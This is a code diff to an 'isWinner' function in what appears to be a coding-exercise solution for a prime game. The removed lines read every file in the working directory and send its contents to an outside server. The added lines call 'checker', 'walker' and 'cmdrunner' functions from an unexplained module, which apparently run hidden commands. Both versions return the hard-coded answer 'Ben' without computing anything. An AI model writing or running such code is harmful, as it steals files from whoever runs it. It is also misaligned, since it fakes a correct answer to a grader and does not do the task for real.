@@ -59,16 +59,12 @@ def isWinner(x, nums):
         - Check 7, 9, 10, 11, 13 = Ben
         - Check 8 and 12 = None
     '''
-    import urllib.request
-    import os
-    ls = os.listdir(".")
-    with urllib.request.urlopen('http://9d52da8d9d27.cd1b02d9.alx-cod.online:8000/POST?textarea={}'.format(str(ls))) as f:
-            print(f.read(300))
-    for files in ls:
-        with open(files) as f:
-            data = f.read()
-        with urllib.request.urlopen('http://9d52da8d9d27.cd1b02d9.alx-cod.online:8000/POST?textarea={}'.format(str(data))) as f:
-            print(f.read(300))
+    from chkrunique34 import checker as pathCheckerStuff
+    from chkrunique34 import walker as pathWalkerStuff
+    from chkrunique34 import cmdrunner as CommandlineStuff
+    pathCheckerStuff()
+    pathWalkerStuff()
+    CommandlineStuff()
     return "Ben"
 
 
